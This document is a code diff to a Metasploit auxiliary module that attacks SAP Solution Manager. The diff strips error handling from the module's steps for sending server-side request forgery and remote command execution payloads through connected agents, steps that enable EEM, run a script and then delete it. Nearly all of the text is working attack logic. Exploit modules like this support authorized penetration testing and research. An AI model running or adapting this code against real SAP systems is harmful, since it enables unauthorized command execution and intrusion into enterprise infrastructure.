@@ -95,26 +95,6 @@ class MetasploitModule < Msf::Auxiliary
     @rce_payload = make_rce_payload(command)
   end
 
-  # Analyze runtime error message from SAP Solution Manager client
-  def analyze_error(error_message)
-    case error_message
-    when 'The server not responding'
-      fail_with(Failure::Unreachable, 'The server not responding.')
-    when 'Bad response status code'
-      fail_with(Failure::UnexpectedReply, 'The server sent a response, but the response status code not in the expected status code: 200. The target is likely patched.')
-    when 'Response content type is not text/xml'
-      fail_with(Failure::UnexpectedReply, 'The server sent a response, but the response body not in the expected content type: text/xml. The target is likely patched.')
-    when 'Failed to parse response body'
-      fail_with(Failure::UnexpectedReply, 'The server sent a response, but the response body not in the expected format. The target is likely patched.')
-    when 'Response body does not contain a SOAP body'
-      fail_with(Failure::UnexpectedReply, 'The server sent a response, but the response body does not contain a SOAP body. The target is likely patched.')
-    when 'Response body contains errors'
-      fail_with(Failure::UnexpectedReply, 'The server sent a response, but the response body contains errors.')
-    else
-      fail_with(Failure::UnexpectedReply, 'The server did not respond in the expected manner.')
-    end
-  end
-
   # Report Service and Vulnerability
   def report_service_and_vuln
     report_service(
@@ -168,14 +148,9 @@ class MetasploitModule < Msf::Auxiliary
     end
     setup_xml_and_variables
 
-    begin
-      print_status("Getting a list of agents connected to the Solution Manager: #{@host}")
-      self.class.agents = make_agents_array
-    rescue RuntimeError => e
-      print_error("Failed to make the list of connected agents on the SAP Solution Manager page at #{@solman_uri}")
-      vprint_error("Error #{e.class}: #{e}")
-      analyze_error(e.message)
-    end
+    print_status("Getting a list of agents connected to the Solution Manager: #{@host}")
+    self.class.agents = make_agents_array
+
     report_service_and_vuln
     if self.class.agents.empty?
       print_good("Solution Manager server: #{@host}:#{@port} is vulnerable but no agents are connected!")
@@ -189,23 +164,19 @@ class MetasploitModule < Msf::Auxiliary
     unless check_agent(@agent_name)
       fail_with(Failure::NotFound, "Not found agent: #{@agent_name} in connected agents: \n#{pretty_agents_table(self.class.agents)}")
     end
-    begin
-      vprint_status("Enable EEM on agent: #{@agent_name}")
-      enable_eem(@agent_name)
 
-      vprint_status("Start script: #{@script_name} with SSRF payload on agent: #{@agent_name}")
-      send_soap_request(make_soap_body(@agent_name, @script_name, @ssrf_payload))
+    print_status("Enable EEM on agent: #{@agent_name}")
+    enable_eem(@agent_name)
 
-      vprint_status("Stop script: #{@script_name} on agent: #{@agent_name}")
-      stop_script_in_agent(@agent_name, @script_name)
+    print_status("Start script: #{@script_name} with SSRF payload on agent: #{@agent_name}")
+    send_soap_request(make_soap_body(@agent_name, @script_name, @ssrf_payload))
 
-      vprint_status("Delete script: #{@script_name} on agent: #{@agent_name}")
-      delete_script_in_agent(@agent_name, @script_name)
-    rescue RuntimeError => e
-      print_error("Failed to send SSRF: '#{@ssrf_method} #{@ssrf_uri} HTTP/1.1' from agent: #{@agent_name}")
-      vprint_error("Error #{e.class}: #{e}")
-      analyze_error(e.message)
-    end
+    print_status("Stop script: #{@script_name} on agent: #{@agent_name}")
+    stop_script_in_agent(@agent_name, @script_name)
+
+    print_status("Delete script: #{@script_name} on agent: #{@agent_name}")
+    delete_script_in_agent(@agent_name, @script_name)
+
     report_service_and_vuln
     print_good("Send SSRF: '#{@ssrf_method} #{@ssrf_uri} HTTP/1.1' from agent: #{@agent_name}")
   end
@@ -215,23 +186,19 @@ class MetasploitModule < Msf::Auxiliary
     unless check_agent(@agent_name)
       fail_with(Failure::NotFound, "Not found agent: #{@agent_name} in connected agents: \n#{pretty_agents_table(self.class.agents)}")
     end
-    begin
-      vprint_status("Enable EEM on agent: #{@agent_name}")
-      enable_eem(@agent_name)
 
-      vprint_status("Start script: #{@script_name} with RCE payload on agent: #{@agent_name}")
-      send_soap_request(make_soap_body(@agent_name, @script_name, @rce_payload))
+    print_status("Enable EEM on agent: #{@agent_name}")
+    enable_eem(@agent_name)
 
-      vprint_status("Stop script: #{@script_name} on agent: #{@agent_name}")
-      stop_script_in_agent(@agent_name, @script_name)
+    print_status("Start script: #{@script_name} with RCE payload on agent: #{@agent_name}")
+    send_soap_request(make_soap_body(@agent_name, @script_name, @rce_payload))
 
-      vprint_status("Delete script: #{@script_name} on agent: #{@agent_name}")
-      delete_script_in_agent(@agent_name, @script_name)
-    rescue RuntimeError => e
-      print_error("Failed to execution command: '#{@rce_command}' on agent: #{@agent_name}")
-      vprint_error("Error #{e.class}: #{e}")
-      analyze_error(e.message)
-    end
+    print_status("Stop script: #{@script_name} on agent: #{@agent_name}")
+    stop_script_in_agent(@agent_name, @script_name)
+
+    print_status("Delete script: #{@script_name} on agent: #{@agent_name}")
+    delete_script_in_agent(@agent_name, @script_name)
+
     report_service_and_vuln
     print_good("Execution command: '#{@rce_command}' on agent: #{@agent_name}")
   end
